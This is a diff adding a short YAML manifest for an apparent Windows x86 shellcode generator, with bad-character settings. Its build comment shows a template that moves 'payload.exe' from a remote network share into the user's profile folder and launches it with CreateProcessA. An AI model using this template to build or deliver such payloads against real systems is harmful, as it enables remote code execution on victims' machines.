@@ -1,0 +1,11 @@
+# OpenProcessToken + GetUserProfileDirectoryA path discovery + MoveFileA + CreateProcessA
+# IR workflow: OpenProcessToken -> GetUserProfileDirectoryA -> lstrcatA ->
+#   MoveFileA -> CreateProcessA (10 args)
+# Returns full profile path (e.g. C:\Users\username) without manual concatenation.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/win-x86/profile_dir_exec.yaml \
+#       --src "\\\\host\\share\\payload.exe" \
+#       --dst "\payload.exe" --no-assemble --out emitter_out/
+template: ir_profile_dir_exec
+badchars: ["00", "0A", "0D"]
